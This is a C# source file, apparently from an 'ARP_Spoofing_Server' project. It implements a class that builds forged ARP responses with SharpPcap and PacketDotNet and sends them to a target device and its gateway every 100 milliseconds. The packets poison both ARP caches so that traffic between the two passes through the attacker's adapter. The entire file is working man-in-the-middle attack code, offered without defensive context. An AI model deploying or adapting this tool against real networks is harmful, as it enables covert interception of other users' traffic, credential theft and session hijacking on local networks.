using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ARP_Spoofing_Server
{
    public class SpoofARP
    {
        #region --- Class Data -------------------------------

        private object syncRoot = new Object();
        private bool _isRunning = false;

        #endregion

        #region --- Constructor ------------------------------

        public SpoofARP(ILiveDevice liveDevice, string srcIpAddresse,
                        string srcMacAddr, string desIpAddresse,
                        string desMacAddr)
        {
            Adapter = liveDevice;
            SrcIpAddresse = IPAddress.Parse(srcIpAddresse);
            SrcMACAddresse = PhysicalAddress.Parse(srcMacAddr);
            DesIpAddresse = IPAddress.Parse(desIpAddresse);
            DesMACAddresse = PhysicalAddress.Parse(desMacAddr);
        }
        #endregion

        #region --- Public Methods ---------------------------

        public void SendArpResponsesAsync()
        {
            lock (this.syncRoot)
            {
                if (TargetDevicePacket != null || GatwayPacket != null)
                {
                    if (!this._isRunning)
                    {
                        ThreadPool.QueueUserWorkItem(_ => ThreadProc());
                    }
                }
                else
                {
                    Error = true;
                }
            }
        }

        public void StopAsync()
        {
            ThreadStart ts = new ThreadStart(Stop);
            Thread thd = new Thread(ts);
            thd.Start();
        }
        #endregion

        #region --- Private Methods --------------------------

        private void Stop()
        {
            lock (this.syncRoot)
            {
                if (this._isRunning)
                {
                    // Tell the worker thread that it needs to abort.
                    this._isRunning = false;
                }
            }
        }

        private void ThreadProc()
        {
            this._isRunning = true;

            while (this._isRunning)
            {
                Adapter.SendPacket(TargetDevicePacket);
                Adapter.SendPacket(GatwayPacket);
                Thread.Sleep(100);
            }
        }

        #endregion

        #region --- IDisposable-------------------------------

        private bool disposed = false;
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!this.disposed)
            {
                if (disposing)
                {
                    // Clean up all managed resources
                    Stop();
                }
            }

            // Clean up all native resources

            disposed = true;
        }

        #endregion

        #region --- Properties -------------------------------
        public ILiveDevice Adapter { get; set; }
        public IPAddress SrcIpAddresse { get; set; }
        public PhysicalAddress SrcMACAddresse { get; set; }
        public IPAddress DesIpAddresse { get; set; }
        public PhysicalAddress DesMACAddresse { get; set; }

        public bool Error = false;
        public Packet TargetDevicePacket
        {
            get
            {
                try
                {
                    if (SrcIpAddresse == null
                        || SrcMACAddresse == null
                        || DesIpAddresse == null
                        || DesMACAddresse == null)
                    {
                        throw new Exception
                        ("one or more of the required value is null");
                    }
                    else
                    {
                        EthernetPacket EthernetPacket = new EthernetPacket(
                                                         Adapter.MacAddress,
                                                         DesMACAddresse,
                                                         EthernetType.Arp);

                        ArpPacket ArpPacket = new ArpPacket(
                                                        ArpOperation.Response,
                                                        DesMACAddresse, DesIpAddresse,
                                                         Adapter.MacAddress,
                                                          SrcIpAddresse);

                        EthernetPacket.PayloadPacket = ArpPacket;

                        return EthernetPacket;
                    }
                }
                catch (Exception ex)
                {
                    Error = true;

                    return null;
                }
            }
        }

        public Packet GatwayPacket
        {
            get
            {
                try
                {
                    if (SrcIpAddresse == null
                       || SrcMACAddresse == null
                       || DesIpAddresse == null
                       || DesMACAddresse == null)
                    {
                        throw new Exception
                        ("one or more of the required value is null");
                    }
                    else
                    {
                        EthernetPacket EthernetPacket = new EthernetPacket(
                                                           Adapter.MacAddress,
                                                           SrcMACAddresse,
                                                           EthernetType.Arp);

                        ArpPacket ArpPacket = new ArpPacket(
                                                             ArpOperation.Response
                                                             , SrcMACAddresse
                                                             , SrcIpAddresse
                                                             , Adapter.MacAddress
                                                             , DesIpAddresse);

                        EthernetPacket.PayloadPacket = ArpPacket;

                        return EthernetPacket;
                    }
                }
                catch (Exception ex)
                {
                    Error = true;

                    return null;
                }
            }
        }
        public bool IsRunning
        {
            get { return this._isRunning; }
        }

        #endregion
    }
}
